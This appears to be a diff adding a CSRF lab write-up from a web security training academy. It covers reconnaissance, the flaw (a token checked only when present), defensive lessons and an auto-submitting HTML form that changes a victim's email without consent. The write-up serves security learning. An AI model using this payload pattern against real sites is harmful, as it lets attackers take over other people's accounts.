@@ -1,0 +1,61 @@
+================================
+LAB: CSRF where token validation depends on token being present
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 03, 2026
+Lab URL: https://0a3a001704b2081381dab19e00140052.web-security-academy.net
+Category: CSRF (Cross-Site Request Forgery)
+Level: Apprentice
+Objective: Use exploit server to host HTML page that performs CSRF attack to change victim's email address
+Description: Email change functionality vulnerable to CSRF when token parameter is omitted
+
+[RECONNAISSANCE]
+----------------
+- Logged in as wiener:peter
+- Intercepted legitimate email change request in Burp Suite
+- Request structure: POST /my-account/change-email with two parameters: email and csrf token
+- Request included csrf parameter: csrf=ZCVz4qv4DSnXXoTOjmD1gQAV4C5uGveZ
+- Application validates token only when present, not when absent
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Backend logic checks if csrf token is valid only when the parameter exists. If csrf parameter is removed entirely, validation is skipped and request succeeds.
+
+[EXPLOITATION]
+--------------
+Payload:
+```html
+<html>
+  <body>
+    <form action="https://0a3a001704b2081381dab19e00140052.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="test2@test.ca" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+```
+
+Steps:
+1. Generated CSRF PoC using Burp Suite Pro
+2. Removed csrf token parameter from form
+3. Stored payload on exploit server
+4. Delivered exploit to victim
+5. Victim's email changed without their consent
+
+[EVIDENCE]
+----------
+Lab marked as solved after delivering exploit to victim. Email change occurred without valid CSRF token because parameter was omitted entirely.
+
+[LESSONS LEARNED]
+-----------------
+- Validation logic must check for token presence AND validity - never skip validation when parameter is missing
+- Proper defense: reject request if token parameter absent or invalid
+- This pattern (validate only if present) is common logic flaw in custom CSRF implementations
+- Always test removing security tokens entirely, not just manipulating their values
+- SameSite cookie attribute would prevent this attack vector
